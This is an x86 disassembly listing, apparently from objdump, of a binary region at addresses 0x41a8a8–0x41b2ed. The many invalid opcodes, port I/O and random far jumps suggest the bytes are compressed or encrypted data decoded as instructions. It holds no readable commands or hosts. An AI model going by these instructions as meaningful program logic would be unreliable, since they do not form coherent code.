  41a8a8:	fisub  DWORD PTR [ecx]
  41a8aa:	test   BYTE PTR [ebp+0x5e],cl
  41a8ad:	add    al,0xd8
  41a8af:	aad    0xd3
  41a8b1:	cld    
  41a8b2:	pop    edx
  41a8b3:	(bad)  
  41a8b4:	fisttp DWORD PTR [edi-0x14]
  41a8b7:	add    eax,0x71d68a54
  41a8bc:	pop    esp
  41a8bd:	adc    ah,BYTE PTR [ebx]
  41a8bf:	out    dx,eax
  41a8c0:	pop    ebp
  41a8c1:	stc    
  41a8c2:	loop   0x41a898
  41a8c4:	cdq    
  41a8c5:	in     eax,0x89
  41a8c7:	test   DWORD PTR [ecx-0x33898ef4],ecx
  41a8cd:	ds push edx
  41a8cf:	fild   DWORD PTR [ecx+edx*8]
  41a8d2:	leave  
  41a8d3:	inc    ebp
  41a8d4:	test   al,0x43
  41a8d6:	jp     0x41a8cc
  41a8d8:	mov    esi,edi
  41a8da:	fwait
  41a8db:	xchg   BYTE PTR [ebp-0x70138e75],al
  41a8e1:	push   0xc1274fa3
  41a8e6:	and    BYTE PTR ds:0x96d8a400,cl
  41a8ec:	xchg   ebx,eax
  41a8ed:	mov    edx,0x2dd97d9e
  41a8f2:	push   edx
  41a8f3:	(bad)  
  41a8f4:	ja     0x41a92e
  41a8f6:	xor    ecx,edi
  41a8f8:	mov    ebp,DWORD PTR [esi+0x63718528]
  41a8fe:	test   eax,0x8ce86f5c
  41a903:	int3   
  41a904:	popa   
  41a905:	sbb    al,0xaa
  41a907:	jmp    0xee1f:0x1a0a1754
  41a90e:	sub    al,0xcf
  41a910:	push   es
  41a911:	ds scas al,BYTE PTR es:[edi]
  41a913:	mov    ecx,0xd4ffd209
  41a918:	sbb    DWORD PTR [edi],eax
  41a91a:	cmp    DWORD PTR [ecx+edi*2],ebx
  41a91d:	jb     0x41a8e4
  41a91f:	lods   al,BYTE PTR ds:[esi]
  41a920:	std    
  41a921:	jmp    0x53fa1794
  41a926:	scas   al,BYTE PTR es:[edi]
  41a927:	ret    
  41a928:	sbb    DWORD PTR [edi+0xc05a06a],esi
  41a92e:	xor    edx,DWORD PTR [eax]
  41a930:	out    dx,al
  41a931:	jnp    0x41a8c5
  41a933:	adc    al,0x89
  41a935:	imul   ebx,esp,0x8dff93d1
  41a93b:	rol    bl,1
  41a93d:	cwde   
  41a93e:	mov    ah,0x6a
  41a940:	shl    BYTE PTR [edx+0x188a53dd],1
  41a946:	adc    al,0x5
  41a948:	adc    eax,0xd55f878
  41a94d:	shr    DWORD PTR [edx],cl
  41a94f:	mov    esi,0x1bb2ce48
  41a954:	inc    edx
  41a955:	cmp    BYTE PTR [ebx+eiz*1-0x55e4c126],bh
  41a95c:	mov    ch,0x0
  41a95e:	sub    ecx,eax
  41a960:	jo     0x41a92a
  41a962:	and    DWORD PTR [eax+0x3980e714],eax
  41a968:	adc    al,0xbd
  41a96a:	lods   eax,DWORD PTR ds:[esi]
  41a96b:	dec    edi
  41a96c:	add    DWORD PTR [eax],0x0
	...
  41a9d3:	add    BYTE PTR [eax],al
  41a9d5:	add    BYTE PTR ds:0xcf4a867e,dh
  41a9db:	cli    
  41a9dc:	std    
  41a9dd:	jg     0x41aa2d
  41a9df:	push   edx
  41a9e0:	pushf  
  41a9e1:	dec    esp
  41a9e2:	inc    esp
  41a9e3:	mov    BYTE PTR [edi+eiz*1+0x11e20],0xff
  41a9eb:	add    BYTE PTR [eax],al
  41a9ed:	add    BYTE PTR [edi+edx*2-0x2dccb5c4],dh
  41a9f4:	lods   al,BYTE PTR ds:[esi]
  41a9f5:	adc    DWORD PTR [esi],esi
  41a9f7:	push   ecx
  41a9f8:	xchg   esi,eax
  41a9f9:	das    
  41a9fa:	dec    ebp
  41a9fb:	xor    eax,0xe5a4254c
  41aa00:	pop    esp
  41aa01:	mov    bl,cl
  41aa03:	push   edx
  41aa04:	pop    edx
  41aa05:	mov    ebp,0x15e8fb38
  41aa0a:	xchg   ah,ch
  41aa0c:	mov    ebx,0xc6fd6f4b
  41aa11:	cmc    
  41aa12:	sub    BYTE PTR [edi+0x77347e8f],bh
  41aa18:	iret   
  41aa19:	mov    ecx,?
  41aa1b:	iret   
  41aa1c:	icebp  
  41aa1d:	ror    cl,cl
  41aa1f:	into   
  41aa20:	sub    dh,BYTE PTR [esi+0x9]
  41aa23:	retf   
  41aa24:	inc    ebp
  41aa25:	mov    eax,ebp
  41aa27:	pop    es
  41aa28:	inc    edi
  41aa29:	aam    0x69
  41aa2b:	add    DWORD PTR [edi-0xf0ff88a],esi
  41aa31:	loop   0x41aa5e
  41aa33:	mov    al,ds:0xde0b15de
  41aa38:	iret   
  41aa39:	dec    edi
  41aa3a:	add    dl,BYTE PTR [edi]
  41aa3c:	inc    ebx
  41aa3d:	add    BYTE PTR [edi-0x19],0xc1
  41aa41:	mov    ds:0x5704adbf,eax
  41aa46:	or     dh,BYTE PTR [ecx]
  41aa48:	ficomp WORD PTR [ecx]
  41aa4a:	sbb    edi,ecx
  41aa4c:	xchg   esp,eax
  41aa4d:	xchg   esp,eax
  41aa4e:	ss loope 0x41a9e3
  41aa51:	push   esi
  41aa52:	scas   al,BYTE PTR es:[edi]
  41aa53:	test   eax,0x2ccc5140
  41aa58:	sbb    BYTE PTR [edx+ebp*8-0x25dd7c28],cl
  41aa5f:	call   0x2b31:0x7b7aadf8
  41aa66:	rcl    DWORD PTR [esi+0x4a751162],0xef
  41aa6d:	pop    ds
  41aa6e:	lahf   
  41aa6f:	pop    edx
  41aa70:	sub    ch,ch
  41aa72:	add    DWORD PTR [edx],0xffffffaf
  41aa75:	xchg   DWORD PTR [ecx-0x4a26a7],esp
  41aa7b:	sbb    bh,BYTE PTR [ebx-0xe]
  41aa7e:	sbb    BYTE PTR [ebx+0xae4442f],bl
  41aa84:	dec    ebp
  41aa85:	js     0x41aa2a
  41aa87:	call   FWORD PTR [ebp+0x7bdfab39]
  41aa8d:	fnstcw WORD PTR [esi+0x2aaec69b]
  41aa93:	pop    edx
  41aa94:	cmp    BYTE PTR [edx-0x58],ah
  41aa97:	leave  
  41aa98:	inc    ebx
  41aa99:	and    bh,bl
  41aa9b:	dec    eax
  41aa9c:	in     eax,dx
  41aa9d:	inc    ebp
  41aa9e:	stc    
  41aa9f:	inc    ebx
  41aaa0:	pop    es
  41aaa1:	icebp  
  41aaa2:	xor    al,0x61
  41aaa4:	loope  0x41aa60
  41aaa6:	dec    eax
  41aaa7:	and    DWORD PTR [ecx-0x291d36e6],ebp
  41aaad:	(bad)  [esi]
  41aaaf:	call   0xcc05:0xe7e135d3
  41aab6:	enter  0xb3c8,0x6f
  41aaba:	outs   dx,DWORD PTR ds:[esi]
  41aabb:	mov    eax,0x281a8d31
  41aac0:	cmp    esp,DWORD PTR [esi+0x1f0b287a]
  41aac6:	inc    edx
  41aac7:	xchg   ecx,eax
  41aac8:	or     bh,cl
  41aaca:	dec    esp
  41aacb:	add    BYTE PTR [edi-0x69],ah
  41aace:	scas   eax,DWORD PTR es:[edi]
  41aacf:	adc    al,0xe6
  41aad1:	push   0x813b06a7
  41aad6:	mov    bl,0x14
  41aad8:	add    esp,DWORD PTR [edi]
  41aada:	scas   eax,DWORD PTR es:[edi]
  41aadb:	mov    esp,0xabda68a4
  41aae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aae1:	imul   edi,DWORD PTR [ebx],0xffffffb1
  41aae4:	call   0xebf8:0x2cf3dc0b
  41aaeb:	xchg   esp,eax
  41aaec:	in     al,dx
	...
  41ab55:	add    bh,dh
  41ab57:	add    esp,ebx
  41ab59:	mov    ah,0xfe
  41ab5b:	std    
  41ab5c:	inc    DWORD PTR [ebx+0x5f]
  41ab5f:	sbb    BYTE PTR [esi+0x43],ah
  41ab62:	in     eax,dx
  41ab63:	add    ebp,DWORD PTR [ecx+0x11f1fe1]
  41ab69:	add    bh,bh
  41ab6b:	add    BYTE PTR [eax],al
  41ab6d:	add    BYTE PTR [ebx-0x3b],bl
  41ab70:	mov    bh,0xf2
  41ab72:	dec    ebx
  41ab73:	stc    
  41ab74:	in     al,0x3f
  41ab76:	pop    ebx
  41ab77:	jmp    0x857733d
  41ab7c:	jecxz  0x41abfb
  41ab7e:	pop    es
  41ab7f:	dec    esp
  41ab80:	sub    DWORD PTR [edx],esp
  41ab82:	fsubp  st(0),st
  41ab84:	xchg   edx,eax
  41ab85:	fstp   DWORD PTR [ecx]
  41ab87:	jg     0x41ab21
  41ab89:	xchg   DWORD PTR [ecx+0x12],edx
  41ab8c:	xor    DWORD PTR [edx+0x51d8f98d],ebx
  41ab92:	jmp    0xec436f67
  41ab97:	or     eax,0x33566f49
  41ab9c:	and    ebp,0xffffffaf
  41ab9f:	retf   
  41aba0:	fisub  DWORD PTR [esi-0x1f]
  41aba3:	sbb    DWORD PTR [edx+ebx*4+0x56eb46be],ebp
  41abaa:	jmp    0x41ac21
  41abac:	lds    edx,FWORD PTR [edi-0x1d]
  41abaf:	mov    ds:0xd7022345,al
  41abb4:	or     al,0x58
  41abb6:	leave  
  41abb7:	push   DWORD PTR [ebp-0x1a]
  41abba:	test   BYTE PTR [edi+0x4c],bl
  41abbd:	lods   eax,DWORD PTR ds:[esi]
  41abbe:	sub    al,0xf0
  41abc0:	aam    0xe1
  41abc2:	lods   eax,DWORD PTR ds:[esi]
  41abc3:	sub    dl,dh
  41abc5:	and    ah,BYTE PTR [edx+0x5858eba2]
  41abcb:	cmc    
  41abcc:	sbb    BYTE PTR [eax],0xbe
  41abcf:	pop    ss
  41abd0:	xor    dh,BYTE PTR [eax-0x4be35a99]
  41abd6:	popf   
  41abd7:	fisttp WORD PTR [ebx-0x7313b105]
  41abdd:	jmp    0x4609926a
  41abe2:	idiv   DWORD PTR [ecx+0x1d]
  41abe5:	fimul  WORD PTR [edx+esi*1-0x40]
  41abe9:	inc    ebx
  41abea:	arpl   WORD PTR [ecx],cx
  41abec:	mov    dl,0xaf
  41abee:	cmp    al,0x5a
  41abf0:	fisttp WORD PTR [eax]
  41abf2:	out    dx,eax
  41abf3:	push   0xa8f0b16d
  41abf8:	sub    al,0xe6
  41abfa:	rcr    esi,cl
  41abfc:	cmc    
  41abfd:	cmp    BYTE PTR [edx+ecx*8+0x30],ah
  41ac01:	or     DWORD PTR [ebx+0x10],edi
  41ac04:	sub    bl,al
  41ac06:	pop    ebx
  41ac07:	jecxz  0x41ac3f
  41ac09:	dec    ebx
  41ac0a:	adc    eax,0x5aed0064
  41ac0f:	loop   0x41ac06
  41ac11:	add    BYTE PTR [edi-0xdb2ee24],bl
  41ac17:	push   0xffffffbf
  41ac19:	sub    DWORD PTR gs:[ecx+0x4d826a55],eax
  41ac20:	and    al,0x2b
  41ac22:	push   cs
  41ac23:	add    DWORD PTR [ecx],eax
  41ac25:	retf   
  41ac26:	dec    esi
  41ac27:	fnstenv [eax+0x63]
  41ac2a:	in     eax,0x19
  41ac2c:	idiv   DWORD PTR [esi+ebp*8-0x75]
  41ac30:	cld    
  41ac31:	inc    esi
  41ac32:	jle    0x41ac7b
  41ac34:	jmp    0x3fdded4f
  41ac39:	test   DWORD PTR [esp+ecx*8-0x2a],esp
  41ac3d:	ret    
  41ac3e:	jge    0x41acb7
  41ac40:	aad    0x9f
  41ac42:	(bad)  
  41ac43:	dec    eax
  41ac44:	jle    0x41ac4c
  41ac46:	and    BYTE PTR [esi+0x21b937ac],ch
  41ac4c:	sbb    BYTE PTR [ebx+0x18616aa6],cl
  41ac52:	fsubp  st(0),st
  41ac54:	xchg   edi,eax
  41ac55:	out    dx,eax
  41ac56:	inc    esi
  41ac57:	rcr    DWORD PTR [edi],cl
  41ac59:	enter  0x6ef0,0x96
  41ac5d:	scas   al,BYTE PTR es:[edi]
  41ac5e:	dec    esp
  41ac5f:	adc    al,0xf5
  41ac61:	xchg   ecx,eax
  41ac62:	xchg   esi,eax
  41ac63:	add    eax,0xbd29b91
  41ac68:	icebp  
  41ac69:	sbb    eax,0xe6b8dd
	...
  41acd6:	push   0x49
  41acd8:	es cmp al,0x27
  41acdb:	jg     0x41ad57
  41acdd:	pop    edi
  41acde:	or     al,0x44
  41ace0:	xor    ah,BYTE PTR [ebx+ebx*1+0x3]
  41ace4:	clc    
  41ace5:	mov    al,0x1e
  41ace7:	and    BYTE PTR [ecx],al
  41ace9:	add    bh,bh
  41aceb:	add    BYTE PTR [eax],al
  41aced:	add    BYTE PTR [eax-0x3d234886],ah
  41acf3:	lods   al,BYTE PTR ds:[esi]
  41acf4:	and    al,0x18
  41acf6:	jnp    0x41aceb
  41acf8:	push   eax
  41acf9:	add    dl,BYTE PTR ds:0xb5ba169f
  41acff:	jmp    0x41ac98
  41ad01:	sbb    esi,DWORD PTR [edi-0x36]
  41ad04:	call   0x2a11791a
  41ad09:	lahf   
  41ad0a:	jecxz  0x41acb1
  41ad0c:	or     eax,0x74b7f96a
  41ad11:	clc    
  41ad12:	jg     0x41ad31
  41ad14:	data16 (bad) 
  41ad16:	pop    ds
  41ad17:	or     eax,edx
  41ad19:	or     BYTE PTR cs:[eax+ebx*4-0x43],al
  41ad1e:	ret    0x9c53
  41ad21:	adc    DWORD PTR [eax],0x78de7a05
  41ad27:	push   ebx
  41ad28:	xor    DWORD PTR [ebx+0x49804c37],ecx
  41ad2e:	jbe    0x41ad64
  41ad30:	inc    eax
  41ad31:	arpl   cx,dx
  41ad33:	ss xor al,0x60
  41ad36:	test   BYTE PTR [ebx],al
  41ad38:	aas    
  41ad39:	pop    edi
  41ad3a:	and    DWORD PTR [ebx+0x31],eax
  41ad3d:	loop   0x41ad6c
  41ad3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad40:	sub    eax,0x86afed26
  41ad45:	scas   eax,DWORD PTR es:[edi]
  41ad46:	pusha  
  41ad47:	dec    ebp
  41ad48:	jbe    0x41ad8b
  41ad4a:	test   al,0xb5
  41ad4c:	push   cs
  41ad4d:	lods   eax,DWORD PTR ds:[esi]
  41ad4e:	lock arpl si,cx
  41ad51:	mov    eax,0xc7a6a394
  41ad56:	dec    ebp
  41ad57:	(bad)  
  41ad58:	jae    0x41adb5
  41ad5a:	pop    edi
  41ad5b:	loop   0x41ad66
  41ad5d:	jmp    DWORD PTR es:[ebx+0x7732f252]
  41ad64:	xor    eax,DWORD PTR [esi+esi*4]
  41ad67:	out    0xe0,eax
  41ad69:	inc    DWORD PTR [edx+ebx*1+0x52]
  41ad6d:	and    esp,DWORD PTR [eax+eax*2-0x2d03f32d]
  41ad74:	cwde   
  41ad75:	mov    ebp,0x83a7645d
  41ad7a:	sbb    eax,0xc7b1cad9
  41ad7f:	add    dl,BYTE PTR [ecx-0x14]
  41ad82:	call   DWORD PTR [ebx]
  41ad84:	jno    0x41ada1
  41ad86:	xor    al,0xc6
  41ad88:	rol    DWORD PTR [ebx+0x65],0xf6
  41ad8c:	pop    ecx
  41ad8d:	repnz and eax,0xb30e2fd1
  41ad93:	ficom  DWORD PTR [ecx-0x59]
  41ad96:	lods   eax,DWORD PTR ds:[esi]
  41ad97:	repz xor ah,BYTE PTR [ebp+0x64]
  41ad9b:	scas   al,BYTE PTR es:[edi]
  41ad9c:	jge    0x41ad56
  41ad9e:	ds inc edx
  41ada0:	fimul  DWORD PTR [ebp+0x4b]
  41ada3:	jecxz  0x41ad95
  41ada5:	loope  0x41ad3a
  41ada7:	mov    BYTE PTR [edx],dh
  41ada9:	ja     0x41adea
  41adab:	mov    al,0x56
  41adad:	add    al,0x73
  41adaf:	daa    
  41adb0:	lods   eax,DWORD PTR ds:[esi]
  41adb1:	add    eax,DWORD PTR [ebx+0x7537f640]
  41adb7:	xlat   BYTE PTR ds:[ebx]
  41adb8:	jecxz  0x41ada5
  41adba:	in     al,0xbf
  41adbc:	push   esp
  41adbd:	xchg   DWORD PTR [ebx+0x7ae943e8],ebx
  41adc3:	in     eax,0x1d
  41adc5:	inc    ecx
  41adc6:	pop    edi
  41adc7:	dec    esi
  41adc8:	imul   eax,DWORD PTR [esi+0x5762c0b3],0x20
  41adcf:	pushf  
  41add0:	enter  0x2ecb,0x79
  41add4:	xlat   BYTE PTR ds:[ebx]
  41add5:	ror    DWORD PTR [ecx],0x3d
  41add8:	fidivr WORD PTR [esp+eiz*4-0x14]
  41addc:	and    ah,BYTE PTR [eax+0x6d]
  41addf:	adc    DWORD PTR [edx-0x2b],edx
  41ade2:	repnz scas al,BYTE PTR es:[edi]
  41ade4:	dec    esi
  41ade5:	xlat   BYTE PTR ds:[ebx]
  41ade6:	add    BYTE PTR [ebx-0x7e],0x52
  41adea:	stc    
  41adeb:	es daa 
	...
  41ae55:	add    BYTE PTR [ebp-0x8],dl
  41ae58:	or     DWORD PTR [esi-0x4280053],ebx
  41ae5e:	dec    edi
  41ae5f:	push   eax
  41ae60:	cmp    DWORD PTR [eax+eiz*4+0x1def2d61],esp
  41ae67:	and    DWORD PTR [ecx],eax
  41ae69:	add    bh,bh
  41ae6b:	add    BYTE PTR [eax],al
  41ae6d:	add    BYTE PTR [ebx+0x7a],bl
  41ae70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae71:	cmp    ch,BYTE PTR [edi+0x42]
  41ae74:	cld    
  41ae75:	cmp    BYTE PTR [edx-0x3f32cc9],cl
  41ae7b:	jl     0x41ae97
  41ae7d:	(bad)  
  41ae7e:	and    al,0xe9
  41ae80:	adc    eax,0x3b51d0d3
  41ae85:	or     BYTE PTR [ecx-0x22],0x1a
  41ae89:	mov    WORD PTR [ebp+0x44cd970c],?
  41ae8f:	dec    ecx
  41ae90:	mov    ds:0x3c984e4c,al
  41ae95:	es xchg ecx,eax
  41ae97:	jmp    0x41aea8
  41ae99:	push   0x5a8b1f06
  41ae9e:	push   ss
  41ae9f:	out    dx,eax
  41aea0:	popf   
  41aea1:	mov    ds:0xb31190a3,al
  41aea6:	jne    0x41ae2f
  41aea8:	inc    ebx
  41aea9:	xchg   DWORD PTR [edx],ecx
  41aeab:	push   edi
  41aeac:	ins    BYTE PTR es:[edi],dx
  41aead:	push   ss
  41aeae:	cdq    
  41aeaf:	iret   
  41aeb0:	pop    ds
  41aeb1:	bnd jl 0x41ae43
  41aeb4:	inc    ebx
  41aeb5:	in     al,dx
  41aeb6:	xchg   DWORD PTR [edi-0x23d3e22a],eax
  41aebc:	dec    esp
  41aebd:	in     eax,dx
  41aebe:	loopne 0x41ae59
  41aec0:	dec    edi
  41aec1:	ins    BYTE PTR es:[edi],dx
  41aec2:	push   es
  41aec3:	loop   0x41aedc
  41aec5:	icebp  
  41aec6:	clc    
  41aec7:	hlt    
  41aec8:	sbb    cl,BYTE PTR [esi+ebx*8-0x5c]
  41aecc:	sub    al,BYTE PTR fs:[ecx]
  41aecf:	lds    ebp,FWORD PTR [ebx+0x39]
  41aed2:	arpl   WORD PTR [edx],sp
  41aed4:	ds call 0x6f6:0x1684755e
  41aedc:	rol    DWORD PTR [edi],1
  41aede:	xor    eax,0x46bab2f7
  41aee3:	mov    al,0x46
  41aee5:	adc    al,0x2b
  41aee7:	jae    0x41af39
  41aee9:	test   DWORD PTR [ebx+0x2b],ebx
  41aeec:	mov    WORD PTR [ecx-0x47bd8285],es
  41aef2:	cmp    al,0x6
  41aef4:	neg    BYTE PTR [eax+0xc2185cd]
  41aefa:	dec    eax
  41aefb:	repz add eax,0x70f6c311
  41af01:	ret    0x90e4
  41af04:	ds jmp 0x41af08
  41af07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af08:	repz push ebp
  41af0a:	in     eax,0x9a
  41af0c:	xor    eax,0xa76e936e
  41af11:	or     eax,0xf22b766a
  41af16:	ret    0xedcd
  41af19:	leave  
  41af1a:	sbb    DWORD PTR [eax+eax*1+0x70fc79ed],0xc818a953
  41af25:	push   ebp
  41af26:	repnz push eax
  41af28:	or     dh,dl
  41af2a:	leave  
  41af2b:	imul   esp,DWORD PTR [edi+edi*2],0xce9cbbf
  41af32:	add    al,0xcc
  41af34:	cmp    al,bh
  41af36:	dec    ecx
  41af37:	jp     0x41af61
  41af39:	sar    BYTE PTR [edi-0x5dde714f],1
  41af3f:	adc    al,0x6c
  41af41:	jne    0x41af70
  41af43:	popa   
  41af44:	fcom   QWORD PTR [eax-0xa72cdd5]
  41af4a:	xchg   DWORD PTR [esi+0xb],ebx
  41af4d:	pop    ecx
  41af4e:	add    bh,dh
  41af50:	or     DWORD PTR [esi-0x578ae5],0x10
  41af57:	aaa    
  41af58:	inc    edi
  41af59:	adc    BYTE PTR [ebp-0x4b],dl
  41af5c:	adc    ebx,ebx
  41af5e:	cli    
  41af5f:	addr16 ret 0x1ce6
  41af63:	(bad)  
  41af64:	das    
  41af65:	xchg   ebp,eax
  41af66:	jle    0x41afaf
  41af68:	pop    edx
  41af69:	mov    ss,WORD PTR [esi+0x7f87]
	...
  41afd3:	add    BYTE PTR [eax],al
  41afd5:	add    ch,al
  41afd7:	stc    
  41afd8:	lods   eax,DWORD PTR ds:[esi]
  41afd9:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41afdf:	mov    ecx,0x7c4e44ee
  41afe4:	ins    BYTE PTR es:[edi],dx
  41afe5:	cdq    
  41afe6:	sbb    al,0x22
  41afe8:	add    DWORD PTR [eax],eax
  41afea:	inc    DWORD PTR [eax]
  41afec:	add    BYTE PTR [eax],al
  41afee:	loope  0x41b013
  41aff0:	mov    edx,0xbb947c2
  41aff5:	ret    0x42a9
  41aff8:	imul   ebp,DWORD PTR [edx+eiz*1+0x35e541ef],0xc425d5e9
  41b003:	mov    ds:0xc798b811,eax
  41b008:	mov    ecx,0x30c349c5
  41b00d:	push   edi
  41b00e:	lods   al,BYTE PTR ds:[esi]
  41b00f:	pusha  
  41b010:	pop    eax
  41b011:	loope  0x41b05d
  41b013:	pop    edx
  41b014:	leave  
  41b015:	xchg   ecx,eax
  41b016:	adc    bl,dl
  41b018:	iret   
  41b019:	repz xor DWORD PTR [ebp+ecx*1+0x35],ebx
  41b01e:	jb     0x41b097
  41b020:	std    
  41b021:	cwde   
  41b022:	sub    eax,0x1ea61b0a
  41b027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b028:	pushf  
  41b029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b02a:	nop
  41b02b:	imul   edx,DWORD PTR ds:0x6ee47aa0,0x44
  41b032:	xchg   ebp,eax
  41b033:	jbe    0x41b07b
  41b035:	pop    eax
  41b036:	in     eax,dx
  41b037:	ds int3 
  41b039:	cmp    edi,esi
  41b03b:	inc    ebx
  41b03c:	push   edi
  41b03d:	inc    esi
  41b03e:	test   eax,0x5f33bbac
  41b043:	pusha  
  41b044:	and    eax,0x698f0b30
  41b049:	dec    ecx
  41b04a:	ficomp DWORD PTR [eax-0x33]
  41b04d:	push   ebx
  41b04e:	inc    ecx
  41b04f:	xor    BYTE PTR [bx+di],0x43
  41b053:	jmp    0x4be4:0x1a0c
  41b059:	jmp    0x6b040b58
  41b05e:	aad    0xd
  41b060:	sbb    bl,BYTE PTR [eax+0x34]
  41b063:	dec    eax
  41b064:	fsub   QWORD PTR [esi-0x1d]
  41b067:	push   ebp
  41b068:	mov    esp,ebp
  41b06a:	jmp    0x8152d0e7
  41b06f:	out    dx,al
  41b070:	lds    ecx,FWORD PTR [ebx-0x3b423f51]
  41b076:	lods   al,BYTE PTR ds:[esi]
  41b077:	(bad)  [eax+ecx*4-0x55b0f958]
  41b07e:	adc    esp,eax
  41b080:	and    ch,al
  41b082:	cmp    ebx,ebp
  41b084:	jo     0x41b03d
  41b086:	nop
  41b087:	retf   
  41b088:	inc    esp
  41b089:	mov    ds:0x7abcb610,al
  41b08e:	(bad)  
  41b08f:	jno    0x41b032
  41b091:	les    ecx,FWORD PTR [edi+0x65cbafa4]
  41b097:	jo     0x41b04e
  41b099:	lds    edi,FWORD PTR [ecx-0x77]
  41b09c:	inc    ecx
  41b09d:	inc    eax
  41b09e:	mov    eax,0x2b8aa26d
  41b0a3:	mov    BYTE PTR ds:0xd412ce71,bh
  41b0a9:	sbb    al,0xa5
  41b0ab:	out    dx,eax
  41b0ac:	push   es
  41b0ad:	mov    WORD PTR [edi-0x56a3b899],?
  41b0b3:	mov    esi,0xb7c4d791
  41b0b8:	xor    DWORD PTR [esi-0x2214257c],esp
  41b0be:	into   
  41b0bf:	push   edi
  41b0c0:	xor    BYTE PTR ds:0x46ddaa9c,dl
  41b0c6:	jg     0x41b0f6
  41b0c8:	jb     0x41b088
  41b0ca:	ins    DWORD PTR es:[edi],dx
  41b0cb:	jnp    0x41b064
  41b0cd:	jecxz  0x41b137
  41b0cf:	(bad)  
  41b0d0:	fimul  DWORD PTR [esi+0x1b]
  41b0d3:	test   DWORD PTR ds:0x13221388,ebx
  41b0d9:	sbb    DWORD PTR [ecx-0x1b],ebp
  41b0dc:	adc    BYTE PTR [ebx+0x5f],dl
  41b0df:	loopne 0x41b0e1
  41b0e1:	loopne 0x41b127
  41b0e3:	mov    ebx,0x34294f80
  41b0e8:	fidivr DWORD PTR [edi+0x91831]
	...
  41b156:	(bad)  
  41b157:	ficom  WORD PTR [eax]
  41b159:	stos   DWORD PTR es:[edi],eax
  41b15a:	sbb    bh,ch
  41b15c:	(bad)  
  41b15d:	call   DWORD PTR [edx+edx*8+0x75]
  41b161:	mov    edi,0x48061c33
  41b166:	sbb    esp,DWORD PTR [ebx]
  41b168:	add    DWORD PTR [eax],eax
  41b16a:	inc    DWORD PTR [eax]
  41b16c:	add    BYTE PTR [eax],al
  41b16e:	pop    ds
  41b16f:	add    ecx,DWORD PTR [edx-0x71]
  41b172:	mov    ah,0x2a
  41b174:	jle    0x41b1cc
  41b176:	pmaxub mm3,QWORD PTR [edx-0x55]
  41b17a:	mov    ss,edx
  41b17c:	push   0x3c5b2113
  41b181:	xchg   edx,eax
  41b182:	mov    ah,0x62
  41b184:	das    
  41b185:	push   ebp
  41b186:	not    DWORD PTR [edx+0x55]
  41b189:	nop
  41b18a:	push   cs
  41b18b:	adc    BYTE PTR [edx+0x3c],bl
  41b18e:	hlt    
  41b18f:	in     al,0xda
  41b191:	(bad)  
  41b192:	jno    0x41b142
  41b194:	hlt    
  41b195:	shl    BYTE PTR [edi-0x5f],1
  41b198:	rcr    BYTE PTR [ebx-0xdb80eb6],1
  41b19e:	push   ecx
  41b19f:	cwde   
  41b1a0:	out    dx,eax
  41b1a1:	mov    esp,0x109fbefc
  41b1a6:	mov    esp,0x4ba7c9d2
  41b1ab:	xor    ecx,esi
  41b1ad:	daa    
  41b1ae:	sub    dh,dh
  41b1b0:	sub    DWORD PTR [edi-0x7545e877],0x15
  41b1b7:	sbb    DWORD PTR [ebx+0x3c7271d0],esi
  41b1bd:	scas   eax,DWORD PTR es:[edi]
  41b1be:	xor    ch,BYTE PTR [ecx-0x76299d31]
  41b1c4:	xchg   ebp,eax
  41b1c5:	fbstp  TBYTE PTR [eax+edx*2]
  41b1c8:	mov    ds:0x47e6d56f,al
  41b1cd:	arpl   bx,ax
  41b1cf:	(bad)  
  41b1d0:	or     al,0xa9
  41b1d2:	loopne 0x41b204
  41b1d4:	inc    si
  41b1d6:	sub    dh,BYTE PTR [edx+0x2effe146]
  41b1dc:	mov    dh,0xa9
  41b1de:	and    BYTE PTR [ebx],0xfd
  41b1e1:	or     al,0x6
  41b1e3:	pop    eax
  41b1e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1e5:	push   es
  41b1e6:	out    dx,eax
  41b1e7:	ret    0xec1e
  41b1ea:	pusha  
  41b1eb:	cli    
  41b1ec:	fst    QWORD PTR [ebx+0x30afa01d]
  41b1f2:	shl    DWORD PTR [esp+edx*8+0x453db12a],cl
  41b1f9:	ja     0x41b187
  41b1fb:	ss es (bad) 
  41b1fe:	icebp  
  41b1ff:	mov    eax,0x4683d359
  41b204:	fs cld 
  41b206:	fwait
  41b207:	add    edi,DWORD PTR [ecx]
  41b209:	gs out dx,al
  41b20b:	icebp  
  41b20c:	inc    ebx
  41b20d:	mov    esi,0xa2c4ce9a
  41b212:	stos   BYTE PTR es:[edi],al
  41b213:	std    
  41b214:	test   BYTE PTR [ecx-0x7522b32e],dl
  41b21a:	fidivr DWORD PTR ds:0x98cb32a5
  41b220:	nop
  41b221:	xor    al,0xd1
  41b223:	inc    esp
  41b224:	daa    
  41b225:	mov    DWORD PTR [esi+0x4aafede8],esi
  41b22b:	mov    bh,0x21
  41b22d:	add    eax,0x913b8581
  41b232:	sbb    eax,0x6b40eb3
  41b237:	fnsave [esi-0x63010bc7]
  41b23d:	adc    esi,DWORD PTR [ecx-0x67942a0d]
  41b243:	and    dl,BYTE PTR [ebp-0x18]
  41b246:	jb     0x41b278
  41b248:	out    dx,eax
  41b249:	outs   dx,DWORD PTR ds:[esi]
  41b24a:	jecxz  0x41b272
  41b24c:	add    DWORD PTR [ebp-0x56eb7fb4],edi
  41b252:	call   0x77472e4c
  41b257:	popa   
  41b258:	mov    DWORD PTR ds:0xe7e8bce0,esp
  41b25e:	pusha  
  41b25f:	xor    dl,BYTE PTR [edx+eax*2]
  41b262:	pop    eax
  41b263:	jg     0x41b25a
  41b265:	std    
  41b266:	xor    DWORD PTR [eax-0x7e3185ba],0x98
	...
  41b2d4:	add    BYTE PTR [eax],al
  41b2d6:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b2dc:	(bad)  
  41b2dd:	out    dx,eax
  41b2de:	stos   BYTE PTR es:[edi],al
  41b2df:	jge    0x41b27c
  41b2e1:	or     BYTE PTR [ecx],al
  41b2e3:	clc    
  41b2e4:	lock jne 0x41b301
  41b2e7:	and    al,0x1
  41b2e9:	add    bh,bh
  41b2eb:	add    BYTE PTR [eax],al
  41b2ed:	add    BYTE PTR [eax+0x3c],ch
